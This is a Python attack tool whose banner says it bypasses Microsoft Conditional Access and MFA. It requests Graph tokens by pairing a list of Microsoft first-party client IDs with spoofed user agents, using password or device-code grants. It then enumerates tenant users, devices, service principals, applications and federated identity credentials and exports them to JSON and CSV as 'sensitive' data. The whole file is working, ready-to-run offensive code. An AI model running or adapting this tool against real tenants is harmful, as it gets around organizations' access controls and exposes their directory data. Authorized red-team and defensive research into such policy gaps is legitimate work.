#!/usr/bin/env python3
"""
When you dont have MFA and cannot bypass Conditional access policies this script will help you to gather some information
such as user information and device information from Graph via documented exclusions:

https://entrascopes.com/
"""

import json
import sys
import base64
import requests
from datetime import datetime
from pathlib import Path
import argparse
from urllib.parse import urlencode

# Client IDs
client_ids = {
    "Accounts Control UI": "a40d7d7d-59aa-447e-a655-679a4107e548",
    "Copilot App": "14638111-3389-403d-b206-a6a71d9f8f16",
    "Designer App": "598ab7bb-a59c-4d31-ba84-ded22c220dbd",
    "Enterprise Roaming and Backup": "60c8bde5-3167-4f92-8fdb-059f6176dc0f",
    "Intune MAM": "6c7e8096-f593-4d72-807f-a5f86dcc9c77",
    "Loop": "0922ef46-e1b9-4f7e-9134-9ad00547eb41",
    "M365 Compliance Drive Client": "be1918be-3fe3-4be9-b32b-b542fc27f02e",
    "Microsoft 365 Copilot": "0ec893e0-5785-4de6-99da-4ed124e5296c",
    "Microsoft Authentication Broker": "29d9ed98-a469-4536-ade2-f981bc1d605e",
    "Microsoft Authenticator App": "4813382a-8fa7-425e-ab75-3b753aab3abb",
    "Microsoft Azure CLI": "04b07795-8ddb-461a-bbee-02f9e1bf7b46",
    "Microsoft Azure PowerShell": "1950a258-227b-4e31-a9cf-717495945fc2",
    "Microsoft Bing Search for Microsoft Edge": "2d7f3606-b07d-41d1-b9d2-0d0c9296a6e8",
    "Microsoft Bing Search": "cf36b471-5b44-428c-9ce7-313bf84528de",
    "Microsoft Defender for Mobile": "dd47d17a-3194-4d86-bfd5-c6ae6f5651e3",
    "Microsoft Defender Platform": "cab96880-db5b-4e15-90a7-f3f1d62ffe39",
    "Microsoft Docs": "18fbca16-2224-45f6-85b0-f7bf2b39b3f3",
    "Microsoft Edge Enterprise New Tab Page": "d7b530a4-7680-4c23-a8bf-c52c121d2e87",
    "Microsoft Edge MSAv2": "82864fa0-ed49-4711-8395-a0e6003dca1f",
    "Microsoft Edge": "e9c51622-460d-4d3d-952d-966a5b1da34c",
    "Microsoft Edge2": "ecd6b820-32c2-49b6-98a6-444530e5a77a",
    "Microsoft Edge3": "f44b1140-bc5e-48c6-8dc0-5cf5a53c0e34",
    "Microsoft Exchange REST API Based Powershell": "fb78d390-0c51-40cd-8e17-fdbfab77341b",
    "Microsoft Flow": "57fcbcfa-7cee-4eb1-8b25-12d2030b4ee0",
    "Microsoft Intune Company Portal": "9ba1a5c7-f17a-4de9-a1f1-6178c8d51223",
    "Microsoft Intune Windows Agent": "fc0f3af4-6835-4174-b806-f7db311fd2f3",
    "Microsoft Lists App on Android": "a670efe7-64b6-454f-9ae9-4f1cf27aba58",
    "Microsoft Office": "d3590ed6-52b3-4102-aeff-aad2292ab01c",
    "Microsoft Planner": "66375f6b-983f-4c2c-9701-d680650f588f",
    "Microsoft Power BI": "c0d2a505-13b8-4ae0-aa9e-cddd5eab0b12",
    "Microsoft Stream Mobile Native": "844cca35-0656-46ce-b636-13f48b0eecbd",
    "Microsoft Teams - Device Admin Agent": "87749df4-7ccf-48f8-aa87-704bad0e0e16",
    "Microsoft Teams": "1fec8e78-bce4-4aaf-ab1b-5451cc387264",
    "Microsoft To-Do client": "22098786-6e16-43cc-a27d-191a01a1e3b5",
    "Microsoft Tunnel": "eb539595-3fe1-474e-9c1d-feb3625d1be5",
    "Microsoft Whiteboard Client": "57336123-6e14-4acc-8dcf-287b6088aa28",
    "ODSP Mobile Lists App": "540d4ff4-b4c0-44c1-bd06-cab1782d582a",
    "Office 365 Exchange Online": "00000002-0000-0ff1-ce00-000000000000",
    "Office 365 Management": "00b41c95-dab0-4487-9791-b9d2c32c80f2",
    "Office UWP PWA": "0ec893e0-5785-4de6-99da-4ed124e5296c",
    "OneDrive iOS App": "af124e86-4e96-495a-b70a-90f90ab96707",
    "OneDrive SyncEngine": "ab9b8c07-8f02-4f72-87fa-80105867a763",
    "OneDrive": "b26aadf8-566f-4478-926f-589f601d9c74",
    "Outlook Lite": "e9b154d0-7658-433b-bb25-6b8e0a8a7c59",
    "Outlook Mobile": "27922004-5251-4030-b22d-91ecd9a37ea4",
    "PowerApps": "4e291c71-d680-4d0e-9640-0a3358e31177",
    "SharePoint Android": "f05ff7c9-f75a-4acd-a3b5-f4b6a870245d",
    "SharePoint": "d326c1ce-6cc6-4de2-bebc-4591e5e13ef0",
    "Universal Store Native Client": "268761a2-03f3-40df-8a8b-c3db24145b6b",
    "Visual Studio": "872cd9fa-d31f-45e0-9eab-6e460a02d1f1",
    "Windows Search": "26a7ee05-5602-4d76-a7ba-eae8b7b67941",
    "Windows Spotlight": "1b3c667f-cde3-4090-b60b-3d2abd0117f0",
    "Yammer iPhone": "a569458c-7f2b-45cb-bab9-b7dee514d112",
    "ZTNA Network Access Client": "038ddad9-5bbe-4f64-b0cd-12434d1e633b",
    "ZTNA Network Access Client Private": "760282b4-0cfc-4952-b467-c8e0298fee16",
    "ZTNA Network Access Client M365": "d5e23a82-d7e1-4886-af25-27037a0fdc2a",
    "Azure Active Directory PowerShell": "1b730954-1685-4b74-9bfd-dac224a7b894",
    "Aadrm Admin Powershell": "90f610bf-206d-4950-b61d-37fa6fd1b224",
    "Microsoft SharePoint Online Management Shell": "9bc3ab49-b65d-410a-85ad-de819febfddc",
    "Microsoft Power Query for Excel": "a672d62c-fc7b-4e81-a576-e60dc46e951d",
    "Visual Studio Code": "aebc6443-996d-45c2-90f0-388ff96faa56",
    "SharePoint Online Client Extensibility": "c58637bb-e2e1-4312-8a00-04b5ffcd3403",
    "Microsoft Azure Active Directory Connect": "cb1056e2-e479-49de-ae31-7812af012ed8",
    "Azure Analysis Services Client": "cf710c6e-dfcc-4fa8-a093-d47294e44c66",
    "Microsoft Device Registration Client": "dd762716-544d-4aeb-a526-687b73838a22",
}

# User Agents
user_agents = {
    "Android Chrome": "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.178 Mobile Safari/537.36",
    "iPhone Safari": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
    "Mac Firefox": "Mozilla/5.0 (Macintosh; Intel Mac OS X 14.3; rv:123.0) Gecko/20100101 Firefox/123.0",
    "Chrome OS": "Mozilla/5.0 (X11; CrOS x86_64 15633.69.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.212 Safari/537.36",
    "Linux Firefox": "Mozilla/5.0 (X11; Linux i686; rv:94.0) Gecko/20100101 Firefox/94.0",
    "Windows 10 Chrome": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Windows 7 IE11": "Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko",
    "Windows 10 IE11": "Mozilla/5.0 (Windows NT 10.0; Trident/7.0; rv:11.0) like Gecko",
    "Windows 10 Edge": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.2277.128",
    "Windows Phone": "Mozilla/5.0 (compatible; MSIE 9.0; Windows Phone OS 7.5; Trident/5.0; IEMobile/9.0; NOKIA; Lumia 800)"
}

def list_options():
    """Display available client IDs and user agents"""
    print("\n" + "="*70)
    print("AVAILABLE CLIENT IDs")
    print("="*70)
    for idx, (name, client_id) in enumerate(client_ids.items(), 1):
        print(f"{idx:2d}. {name:45s} {client_id}")
    
    print("\n" + "="*70)
    print("AVAILABLE USER AGENTS")
    print("="*70)
    for idx, (name, ua) in enumerate(user_agents.items(), 1):
        print(f"{idx:2d}. {name:25s} {ua[:60]}...")

def get_token_with_credentials(username, password, client_name, user_agent_name, resource="https://graph.microsoft.com"):
    """Authenticate and get access token using Resource Owner Password Credentials flow"""
    
    client_id = client_ids.get(client_name)
    user_agent = user_agents.get(user_agent_name)
    
    if not client_id:
        print(f"[-] Invalid client name: {client_name}")
        return None
    
    if not user_agent:
        print(f"[-] Invalid user agent name: {user_agent_name}")
        user_agent = user_agents["Windows 10 Chrome"]  # Fallback
    
    print(f"\n[*] Authenticating...")
    print(f"    Client: {client_name}")
    print(f"    Client ID: {client_id}")
    print(f"    User Agent: {user_agent_name}")
    print(f"    Resource: {resource}")
    
    # Token endpoint
    token_url = "https://login.microsoftonline.com/common/oauth2/token"
    
    headers = {
        'User-Agent': user_agent,
        'Content-Type': 'application/x-www-form-urlencoded',
        'Accept': 'application/json'
    }
    
    data = {
        'resource': resource,
        'client_id': client_id,
        'grant_type': 'password',
        'username': username,
        'password': password,
        'scope': 'openid'
    }
    
    try:
        response = requests.post(token_url, headers=headers, data=data, timeout=30)
        
        if response.status_code == 200:
            token_data = response.json()
            print(f"[+] Authentication successful!")
            print(f"    Token Type: {token_data.get('token_type')}")
            print(f"    Expires In: {token_data.get('expires_in')} seconds")
            return token_data
        else:
            print(f"[-] Authentication failed: {response.status_code}")
            try:
                error = response.json()
                print(f"    Error: {error.get('error_description', error.get('error', 'Unknown'))}")
            except:
                print(f"    Response: {response.text[:200]}")
            return None
            
    except Exception as e:
        print(f"[-] Authentication error: {e}")
        return None

def decode_jwt_payload(token):
    """Decode JWT token payload without verification"""
    try:
        parts = token.split('.')
        if len(parts) != 3:
            return None
        
        payload = parts[1]
        padding = 4 - len(payload) % 4
        if padding != 4:
            payload += '=' * padding
        
        decoded = base64.urlsafe_b64decode(payload)
        return json.loads(decoded)
    except Exception as e:
        print(f"[-] Error decoding token: {e}")
        return None

def format_timestamp(ts):
    """Convert Unix timestamp to readable format"""
    try:
        return datetime.fromtimestamp(int(ts)).strftime('%Y-%m-%d %H:%M:%S')
    except:
        return str(ts)

def parse_token_file(filepath):
    """Parse token JSON file"""
    try:
        with open(filepath, 'r', encoding='utf-8') as f:
            content = f.read()
            
        lines = content.split('\n')
        json_lines = [line for line in lines if not line.strip().startswith('[+]')]
        json_content = '\n'.join(json_lines)
        
        data = json.loads(json_content)
        return data
    except FileNotFoundError:
        print(f"[-] File not found: {filepath}")
        return None
    except json.JSONDecodeError as e:
        print(f"[-] Invalid JSON: {e}")
        return None

def analyze_token(token_data):
    """Analyze and display token information"""
    print("\n" + "="*70)
    print("TOKEN ANALYSIS")
    print("="*70)
    
    access_token = token_data.get('access_token')
    if not access_token:
        print("[-] No access_token found in file")
        return None, []
    
    payload = decode_jwt_payload(access_token)
    if not payload:
        print("[-] Failed to decode token")
        return None, []
    
    print(f"\n[*] Token Type: {token_data.get('token_type', 'N/A')}")
    print(f"[*] Scope: {token_data.get('scope', 'N/A')}")
    print(f"[*] Expires: {format_timestamp(token_data.get('expires_on', 'N/A'))}")
    print(f"[*] Resource: {token_data.get('resource', 'N/A')}")
    
    scopes = []
    scope_str = token_data.get('scope', '') or payload.get('scp', '')
    if scope_str:
        scopes = scope_str.split(' ')
    
    print(f"\n[*] Detected Permissions:")
    for scope in scopes:
        print(f"    ✓ {scope}")
    
    print("\n" + "-"*70)
    print("TOKEN CLAIMS")
    print("-"*70)
    
    important_claims = {
        'upn': 'User Principal Name',
        'unique_name': 'Email',
        'name': 'Display Name',
        'given_name': 'First Name',
        'family_name': 'Last Name',
        'oid': 'Object ID',
        'tid': 'Tenant ID',
        'app_displayname': 'Application',
        'appid': 'Application ID',
        'scp': 'Scopes',
        'roles': 'Roles',
        'wids': 'Directory Roles'
    }
    
    for claim, description in important_claims.items():
        value = payload.get(claim)
        if value:
            print(f"  {description:.<40} {value}")
    
    exp = payload.get('exp')
    if exp:
        exp_time = datetime.fromtimestamp(int(exp))
        now = datetime.now()
        if exp_time < now:
            print(f"\n[!] TOKEN EXPIRED: {format_timestamp(exp)}")
            return None, scopes
        else:
            time_left = exp_time - now
            print(f"\n[+] Token valid for: {time_left}")
    
    return access_token, scopes

def query_service_principal_endpoints(access_token, scopes):
    """Query detailed Service Principal Endpoint information"""
    
    if 'ServicePrincipalEndpoint.Read.All' not in scopes:
        print("[!] ServicePrincipalEndpoint.Read.All not available")
        return {}
    
    print("\n" + "="*70)
    print("SERVICE PRINCIPAL ENDPOINT DEEP DIVE")
    print("="*70)
    
    headers = {
        'Authorization': f'Bearer {access_token}',
        'Content-Type': 'application/json'
    }
    
    endpoint_data = {}
    
    try:
        print("\n[*] Fetching all service principals...")
        url = 'https://graph.microsoft.com/v1.0/servicePrincipals?$select=id,appId,displayName,servicePrincipalType'
        response = requests.get(url, headers=headers, timeout=30)
        
        if response.status_code != 200:
            print(f"[-] Failed to get service principals: {response.status_code}")
            return {}
        
        service_principals = response.json().get('value', [])
        print(f"[+] Found {len(service_principals)} service principals")
        
        for sp in service_principals[:50]:
            sp_id = sp['id']
            sp_name = sp['displayName']
            
            print(f"\n[*] Checking endpoints for: {sp_name}")
            
            endpoint_url = f'https://graph.microsoft.com/v1.0/servicePrincipals/{sp_id}/endpoints'
            try:
                ep_response = requests.get(endpoint_url, headers=headers, timeout=10)
                
                if ep_response.status_code == 200:
                    endpoints = ep_response.json().get('value', [])
                    
                    if endpoints:
                        print(f"    [+] Found {len(endpoints)} endpoint(s)")
                        endpoint_data[sp_name] = {
                            'id': sp_id,
                            'appId': sp['appId'],
                            'endpoints': endpoints
                        }
                        
                        if endpoints:
                            first_ep = endpoints[0]
                            print(f"        URI: {first_ep.get('uri', 'N/A')}")
                            print(f"        Capability: {first_ep.get('capability', 'N/A')}")
                            print(f"        Provider: {first_ep.get('providerName', 'N/A')}")
                    else:
                        print(f"    [-] No endpoints found")
                        
            except Exception as e:
                print(f"    [-] Error: {e}")
                continue
        
        print("\n" + "-"*70)
        print("FEDERATED IDENTITY CREDENTIALS")
        print("-"*70)
        
        for sp in service_principals[:20]:
            sp_id = sp['id']
            sp_name = sp['displayName']
            
            fic_url = f'https://graph.microsoft.com/v1.0/servicePrincipals/{sp_id}/federatedIdentityCredentials'
            try:
                fic_response = requests.get(fic_url, headers=headers, timeout=10)
                
                if fic_response.status_code == 200:
                    fics = fic_response.json().get('value', [])
                    
                    if fics:
                        print(f"\n[+] {sp_name}: {len(fics)} federated credential(s)")
                        for fic in fics:
                            print(f"    - Name: {fic.get('name', 'N/A')}")
                            print(f"      Issuer: {fic.get('issuer', 'N/A')}")
                            print(f"      Subject: {fic.get('subject', 'N/A')}")
                            print(f"      Audiences: {', '.join(fic.get('audiences', []))}")
                            
            except Exception as e:
                continue
        
    except Exception as e:
        print(f"[-] Error querying endpoints: {e}")
    
    return endpoint_data

def query_graph_api(access_token, scopes):
    """Query Microsoft Graph API based on available scopes"""
    print("\n" + "="*70)
    print("MICROSOFT GRAPH API QUERIES")
    print("="*70)
    
    headers = {
        'Authorization': f'Bearer {access_token}',
        'Content-Type': 'application/json'
    }
    
    endpoints = {
        '/me': 'Current User Profile',
        '/me/memberOf': 'Group Memberships',
        '/me/licenseDetails': 'License Details',
        '/me/manager': 'Manager Info',
        '/me/directReports': 'Direct Reports',
        '/me/drive': 'OneDrive Info',
        '/organization': 'Organization Info',
    }
    
    if 'Device.Read.All' in scopes:
        print("\n[+] Device.Read.All permission detected - adding device queries")
        endpoints.update({
            '/devices': 'All Devices in Tenant',
            '/devices?$top=100': 'Devices (Top 100)',
            '/devices?$filter=accountEnabled eq true': 'Enabled Devices',
            '/devices?$filter=operatingSystem eq \'Windows\'': 'Windows Devices',
            '/devices?$select=displayName,operatingSystem,operatingSystemVersion,trustType,isCompliant,isManaged': 'Device Details',
            '/me/ownedDevices': 'My Owned Devices',
            '/me/registeredDevices': 'My Registered Devices',
        })
    
    if 'ServicePrincipalEndpoint.Read.All' in scopes:
        print("[+] ServicePrincipalEndpoint.Read.All permission detected - adding service principal queries")
        endpoints.update({
            '/servicePrincipals': 'All Service Principals',
            '/servicePrincipals?$top=100': 'Service Principals (Top 100)',
            '/servicePrincipals?$select=id,appId,displayName,servicePrincipalType,signInAudience': 'Service Principal Details',
            '/servicePrincipals?$filter=servicePrincipalType eq \'Application\'': 'Application Service Principals',
            '/applications': 'All Applications',
            '/applications?$top=100': 'Applications (Top 100)',
            '/servicePrincipals?$expand=endpoints': 'Service Principals with Endpoints',
            '/servicePrincipals?$select=id,displayName&$expand=endpoints': 'SP Endpoints Expanded',
        })
    
    results = {}
    
    for endpoint, description in endpoints.items():
        url = f'https://graph.microsoft.com/v1.0{endpoint}'
        
        try:
            print(f"\n[*] Querying: {description}")
            print(f"    Endpoint: {endpoint}")
            
            response = requests.get(url, headers=headers, timeout=30)
            
            if response.status_code == 200:
                print(f"    [+] Success!")
                
                if endpoint.endswith('$value'):
                    results[endpoint] = f"Binary data ({len(response.content)} bytes)"
                    print(f"        Size: {len(response.content)} bytes")
                else:
                    data = response.json()
                    results[endpoint] = data
                    
                    if 'value' in data:
                        count = len(data['value'])
                        print(f"        Items: {count}")
                        
                        if count > 0 and isinstance(data['value'][0], dict):
                            first_item = data['value'][0]
                            if 'displayName' in first_item:
                                print(f"        First: {first_item['displayName']}")
                            if 'deviceId' in first_item:
                                print(f"        Device ID: {first_item.get('deviceId')}")
                            if 'appId' in first_item:
                                print(f"        App ID: {first_item.get('appId')}")
                    elif 'displayName' in data:
                        print(f"        Name: {data['displayName']}")
                    
            elif response.status_code == 403:
                print(f"    [-] Forbidden (insufficient permissions)")
                results[endpoint] = "FORBIDDEN"
            elif response.status_code == 404:
                print(f"    [-] Not found")
                results[endpoint] = "NOT_FOUND"
            else:
                print(f"    [-] Error: {response.status_code}")
                try:
                    error = response.json()
                    error_msg = error.get('error', {}).get('message', 'Unknown error')
                    print(f"        {error_msg}")
                    results[endpoint] = f"ERROR: {error_msg}"
                except:
                    results[endpoint] = f"ERROR_{response.status_code}"
                
        except requests.exceptions.RequestException as e:
            print(f"    [-] Request failed: {e}")
            results[endpoint] = f"FAILED: {str(e)}"
    
    return results

def extract_sensitive_info(results):
    """Extract and highlight sensitive information"""
    print("\n" + "="*70)
    print("SENSITIVE INFORMATION SUMMARY")
    print("="*70)
    
    sensitive_data = {
        'devices': [],
        'service_principals': [],
        'applications': [],
        'users': []
    }
    
    for endpoint, data in results.items():
        if not isinstance(data, dict) or 'value' not in data:
            continue
        
        if '/devices' in endpoint:
            for device in data['value']:
                sensitive_data['devices'].append({
                    'displayName': device.get('displayName'),
                    'deviceId': device.get('deviceId'),
                    'operatingSystem': device.get('operatingSystem'),
                    'trustType': device.get('trustType'),
                    'isCompliant': device.get('isCompliant'),
                    'isManaged': device.get('isManaged'),
                    'approximateLastSignInDateTime': device.get('approximateLastSignInDateTime')
                })
        
        if '/servicePrincipals' in endpoint:
            for sp in data['value']:
                sensitive_data['service_principals'].append({
                    'displayName': sp.get('displayName'),
                    'appId': sp.get('appId'),
                    'id': sp.get('id'),
                    'servicePrincipalType': sp.get('servicePrincipalType'),
                    'signInAudience': sp.get('signInAudience')
                })
        
        if '/applications' in endpoint:
            for app in data['value']:
                sensitive_data['applications'].append({
                    'displayName': app.get('displayName'),
                    'appId': app.get('appId'),
                    'id': app.get('id'),
                    'signInAudience': app.get('signInAudience')
                })
    
    print(f"\n[*] Devices Found: {len(sensitive_data['devices'])}")
    if sensitive_data['devices']:
        print("    Top 5 Devices:")
        for device in sensitive_data['devices'][:5]:
            print(f"      - {device['displayName']} ({device['operatingSystem']}) - Compliant: {device.get('isCompliant', 'N/A')}")
    
    print(f"\n[*] Service Principals Found: {len(sensitive_data['service_principals'])}")
    if sensitive_data['service_principals']:
        print("    Top 5 Service Principals:")
        for sp in sensitive_data['service_principals'][:5]:
            print(f"      - {sp['displayName']} (AppID: {sp['appId']})")
    
    print(f"\n[*] Applications Found: {len(sensitive_data['applications'])}")
    if sensitive_data['applications']:
        print("    Top 5 Applications:")
        for app in sensitive_data['applications'][:5]:
            print(f"      - {app['displayName']} (AppID: {app['appId']})")
    
    return sensitive_data

def display_detailed_results(results):
    """Display detailed results from Graph API queries"""
    print("\n" + "="*70)
    print("DETAILED RESULTS (First 2000 chars per endpoint)")
    print("="*70)
    
    for endpoint, data in results.items():
        if isinstance(data, dict):
            print(f"\n[+] {endpoint}")
            json_str = json.dumps(data, indent=2, ensure_ascii=False)
            print(json_str[:2000])
            if len(json_str) > 2000:
                print("    ... (truncated, see output file for full data)")
        elif isinstance(data, str) and not data.startswith(('FORBIDDEN', 'ERROR', 'FAILED', 'NOT_FOUND')):
            print(f"\n[+] {endpoint}: {data}")

def save_results(results, sensitive_data, output_file, endpoint_data=None):
    """Save results to JSON file"""
    try:
        output = {
            'timestamp': datetime.now().isoformat(),
            'results': results,
            'sensitive_summary': sensitive_data
        }
        
        if endpoint_data:
            output['service_principal_endpoints'] = endpoint_data
        
        with open(output_file, 'w', encoding='utf-8') as f:
            json.dump(output, f, indent=2, ensure_ascii=False)
        print(f"\n[+] Full results saved to: {output_file}")
        
        if sensitive_data['devices']:
            csv_file = output_file.replace('.json', '_devices.csv')
            with open(csv_file, 'w', encoding='utf-8') as f:
                f.write("DisplayName,DeviceId,OS,TrustType,Compliant,Managed,LastSignIn\n")
                for device in sensitive_data['devices']:
                    f.write(f"{device.get('displayName','')},{device.get('deviceId','')},{device.get('operatingSystem','')},{device.get('trustType','')},{device.get('isCompliant','')},{device.get('isManaged','')},{device.get('approximateLastSignInDateTime','')}\n")
            print(f"[+] Device list saved to: {csv_file}")
        
        if sensitive_data['service_principals']:
            csv_file = output_file.replace('.json', '_serviceprincipals.csv')
            with open(csv_file, 'w', encoding='utf-8') as f:
                f.write("DisplayName,AppId,ObjectId,Type,Audience\n")
                for sp in sensitive_data['service_principals']:
                    f.write(f"{sp.get('displayName','')},{sp.get('appId','')},{sp.get('id','')},{sp.get('servicePrincipalType','')},{sp.get('signInAudience','')}\n")
            print(f"[+] Service principal list saved to: {csv_file}")
        
        if endpoint_data:
            csv_file = output_file.replace('.json', '_endpoints.csv')
            with open(csv_file, 'w', encoding='utf-8') as f:
                f.write("ServicePrincipal,AppId,URI,Capability,Provider\n")
                for sp_name, sp_data in endpoint_data.items():
                    for ep in sp_data.get('endpoints', []):
                        f.write(f"{sp_name},{sp_data.get('appId','')},{ep.get('uri','')},{ep.get('capability','')},{ep.get('providerName','')}\n")
            print(f"[+] Endpoint list saved to: {csv_file}")
            
    except Exception as e:
        print(f"[-] Error saving results: {e}")

def get_token_with_device_code(client_name, user_agent_name, resource="https://graph.microsoft.com"):
    """Authenticate using Device Code Flow (supports MFA)"""
    
    client_id = client_ids.get(client_name)
    user_agent = user_agents.get(user_agent_name)
    
    if not client_id:
        print(f"[-] Invalid client name: {client_name}")
        return None
    
    if not user_agent:
        user_agent = user_agents["Windows 10 Chrome"]
    
    print(f"\n[*] Starting Device Code Flow (MFA-compatible)...")
    print(f"    Client: {client_name}")
    print(f"    Client ID: {client_id}")
    print(f"    Resource: {resource}")
    
    # Device code endpoint
    device_code_url = "https://login.microsoftonline.com/common/oauth2/devicecode"
    
    headers = {
        'User-Agent': user_agent,
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    
    data = {
        'client_id': client_id,
        'resource': resource
    }
    
    try:
        # Request device code
        response = requests.post(device_code_url, headers=headers, data=data, timeout=30)
        
        if response.status_code != 200:
            print(f"[-] Failed to get device code: {response.status_code}")
            return None
        
        device_code_data = response.json()
        
        print(f"\n{'='*70}")
        print(f"[!] USER ACTION REQUIRED - MFA LOGIN")
        print(f"{'='*70}")
        print(f"\n1. Open a browser and navigate to:")
        print(f"   {device_code_data.get('verification_url', 'https://microsoft.com/devicelogin')}")
        print(f"\n2. Enter this code:")
        print(f"   {device_code_data.get('user_code', 'N/A')}")
        print(f"\n3. Complete the sign-in (including MFA if prompted)")
        print(f"\nExpires in: {device_code_data.get('expires_in', 900)} seconds")
        print(f"{'='*70}\n")
        
        # Poll for token
        token_url = "https://login.microsoftonline.com/common/oauth2/token"
        poll_interval = int(device_code_data.get('interval', 5))
        device_code = device_code_data.get('device_code')
        
        token_data = {
            'grant_type': 'urn:ietf:params:oauth:grant-type:device_code',
            'client_id': client_id,
            'code': device_code  # FIX: Changed from 'device_code' to 'code'
        }
        
        print("[*] Waiting for authentication...")
        
        import time
        max_attempts = 60
        
        for attempt in range(max_attempts):
            time.sleep(poll_interval)
            
            token_response = requests.post(token_url, headers=headers, data=token_data, timeout=30)
            
            if token_response.status_code == 200:
                token_result = token_response.json()
                print(f"\n[+] Authentication successful!")
                print(f"    Token Type: {token_result.get('token_type')}")
                print(f"    Expires In: {token_result.get('expires_in')} seconds")
                return token_result
            
            elif token_response.status_code == 400:
                error = token_response.json()
                error_code = error.get('error')
                
                if error_code == 'authorization_pending':
                    elapsed = (attempt + 1) * poll_interval
                    print(f"[*] Waiting for user login... ({elapsed}s elapsed)", end='\r')
                    continue
                elif error_code == 'authorization_declined':
                    print(f"\n[-] User declined the authentication request")
                    return None
                elif error_code == 'expired_token':
                    print(f"\n[-] Device code expired")
                    return None
                else:
                    print(f"\n[-] Error: {error.get('error_description', 'Unknown')}")
                    return None
            else:
                print(f"\n[-] Unexpected response: {token_response.status_code}")
                try:
                    print(f"    Response: {token_response.text[:200]}")
                except:
                    pass
                return None
        
        print(f"\n[-] Timeout waiting for authentication")
        return None
        
    except Exception as e:
        print(f"[-] Device code flow error: {e}")
        import traceback
        traceback.print_exc()
        return None


def main():
    print("""
╔══════════════════════════════════════════════════════════════════════╗
║     Microsoft Graph Conditional Access MFA bypass information        ║
║     Gathering via known public bypass cliendID combinations          ║
╚══════════════════════════════════════════════════════════════════════╝
    """)
    
    parser = argparse.ArgumentParser(description='Microsoft Graph Token Tool')
    parser.add_argument('--list', action='store_true', help='List available clients and user agents')
    parser.add_argument('--username', '-u', help='Username for authentication')
    parser.add_argument('--password', '-p', help='Password for authentication')
    parser.add_argument('--client', '-c', help='Client name from list')
    parser.add_argument('--user-agent', '-a', help='User agent name from list', default='Windows 10 Chrome')
    parser.add_argument('--resource', '-r', help='Resource URL', default='https://graph.microsoft.com')
    parser.add_argument('--token-file', '-t', help='Parse existing token file')
    parser.add_argument('--output', '-o', help='Output file', default='graph_results.json')
    parser.add_argument('--device-code', action='store_true', help='Use Device Code Flow (MFA-compatible)')  # NEU
    
    args = parser.parse_args()
    
    if args.list:
        list_options()
        return
    
    token_data = None
    
    # Mode 1: Device Code Flow (MFA-compatible)
    if args.device_code and args.client:
        token_data = get_token_with_device_code(
            args.client,
            args.user_agent,
            args.resource
        )
        
        if not token_data:
            print("\n[-] Device code authentication failed")
            sys.exit(1)
    
    # Mode 2: Username/Password (falls back to Device Code on MFA error)
    elif args.username and args.password and args.client:
        token_data = get_token_with_credentials(
            args.username,
            args.password,
            args.client,
            args.user_agent,
            args.resource
        )
        
        # If MFA is required, automatically switch to Device Code Flow
        if not token_data:
            print("\n[!] Password flow failed - trying Device Code Flow (MFA-compatible)...")
            token_data = get_token_with_device_code(
                args.client,
                args.user_agent,
                args.resource
            )
        
        if not token_data:
            print("\n[-] Authentication failed")
            sys.exit(1)
    
    # Mode 3: Parse existing token file
    elif args.token_file:
        print(f"[*] Reading token from: {args.token_file}")
        token_data = parse_token_file(args.token_file)
        
        if not token_data:
            sys.exit(1)
    
    else:
        parser.print_help()
        print("\n[!] Usage:")
        print("    1. Username/Password:  --username USER --password PASS --client CLIENT")
        print("    2. Device Code (MFA):  --device-code --client CLIENT")
        print("    3. Parse Token File:   --token-file FILE")
        sys.exit(1)
    
    # Analyze token
    access_token, scopes = analyze_token(token_data)
    
    if not access_token:
        print("\n[-] Cannot proceed without valid access token")
        sys.exit(1)
    
    # Query Graph API
    input("\nPress ENTER to query Microsoft Graph API...")
    results = query_graph_api(access_token, scopes)
    
    # Query Service Principal Endpoints
    endpoint_data = query_service_principal_endpoints(access_token, scopes)
    if endpoint_data:
        results['_service_principal_endpoints'] = endpoint_data
    
    # Extract sensitive information
    sensitive_data = extract_sensitive_info(results)
    
    # Display detailed results
    display_detailed_results(results)
    
    # Save results
    save_results(results, sensitive_data, args.output, endpoint_data)
    
    print("\n[+] Done!")

if __name__ == '__main__':
    main()
